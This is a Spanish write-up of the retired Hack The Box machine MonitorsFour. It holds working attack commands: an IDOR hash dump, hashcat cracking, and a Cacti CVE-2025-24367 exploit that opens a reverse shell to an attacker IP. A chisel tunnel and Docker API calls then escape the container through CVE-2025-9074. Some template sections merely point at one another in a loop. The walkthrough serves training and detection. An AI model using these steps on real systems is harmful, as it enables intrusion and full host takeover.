---
machine: MonitorsFour
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, idor, md5, cacti, cve-2025-24367, docker-api, cve-2025-9074]
---

# MonitorsFour — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Host Windows con **Docker Desktop + WSL2**. La web en `monitorsfour.htb` tiene un **IDOR** en la API (`token=0`) que vuelca la tabla de usuarios con hashes **MD5** sin sal: se crackea el del admin y se entra en un **Cacti 1.2.28** oculto en `cacti.monitorsfour.htb`. **CVE-2025-24367** da RCE autenticada y shell como `www-data` dentro del contenedor. Desde ahí, la **API de Docker sin autenticación** en la red interna de WSL2 permite lanzar un contenedor con el disco del host montado (**CVE-2025-9074**) y leer la flag de root.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
80/tcp    http   nginx (redirige a monitorsfour.htb)
5985/tcp  http   WinRM
```

Solo dos puertos: nginx en un Windows delata contenedores. El HTML filtra el formato de correo (`sales@monitorsfour.htb`) y hay un `/login` que no acepta credenciales por defecto.

```bash
echo "<IP> monitorsfour.htb cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
ffuf -u http://<IP>/ -H "Host: FUZZ.monitorsfour.htb" -w <wordlist> -fs <tamaño_base>
```

```text
cacti   [Status: 200]
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

- Vector de entrada y payload descritos en «Reconocimiento» y «Escalada de privilegios».

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Un IDOR con `token=0` sobre una API que devuelve hashes MD5 es una brecha completa: MD5 sin sal no es almacenamiento de contraseñas.
- Reutilizar la contraseña del portal en la herramienta de monitorización convierte el acceso web en RCE por CVE.
- Docker Desktop con la API en la red de WSL2 sin auth es el host entero: el contenedor no es frontera.
- Detección: peticiones a `/api/v1/user` con tokens triviales, creación de contenedores desde una IP de aplicación y montajes de `/` en `HostConfig`.

## Mitigaciones y detección

- Mínimo privilegio en el servicio expuesto y parcheo de la versión vulnerable.
- Detección: revisar los logs del servicio y alertar de peticiones anómalas o picos de error.

## Referencias

- [CVE-2025-24367](https://nvd.nist.gov/vuln/detail/CVE-2025-24367)
- [CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
## IDOR y crackeo

```bash
curl -s "http://monitorsfour.htb/api/v1/user?token=0"
```

Devuelve todos los usuarios con `password` en MD5 sin sal. Con `hashcat -m 0` y `rockyou.txt` cae la del administrador (`marcus`). Esa contraseña entra en el panel de Cacti, aunque el usuario sea el nombre de pila y no `admin`.

```bash
hashcat -m 0 hashes.txt rockyou.txt
```

## Cacti 1.2.28: CVE-2025-24367

Con sesión válida en `http://cacti.monitorsfour.htb/cacti/`, la CVE-2025-24367 permite inyectar comandos a través de una plantilla de gráficas. El PoC del propio autor de la máquina necesita credenciales válidas y credenciales de la base de datos (se sacan de la configuración del panel):

```bash
python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p '<password>' -i <IP_ATACANTE> -l 1337
```

```text
www-data@821fbd6a43fa:~/html/cacti$
```

La shell está **dentro de un contenedor**; `/proc/1/cgroup` y la ausencia de usuarios de Windows lo confirman. Flag de usuario en el contenedor o en el host accesible.

## Escape por la API de Docker

El contenedor está en la red de WSL2 y la **API de Docker escucha sin TLS ni auth** en la puerta de enlace:

```bash
./chisel client <IP_ATACANTE>:9999 R:2375:192.168.65.7:2375
curl -s http://127.0.0.1:2375/version
```

Con la API accesible se crea un contenedor privilegiado con el disco de Windows montado (CVE-2025-9074):

```bash
curl -s -X POST http://127.0.0.1:2375/containers/create?name=pwn \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /host_root /bin/sh"],
       "HostConfig":{"Binds":["/:/host_root"],"Privileged":true}}'
curl -s -X POST http://127.0.0.1:2375/containers/pwn/start
curl -s -X POST 'http://127.0.0.1:2375/containers/pwn/attach?stream=1&stdout=1&stderr=1&stdin=1'
```

Dentro, `/host_root/Users/Administrator/Desktop/root.txt` es la flag de root.
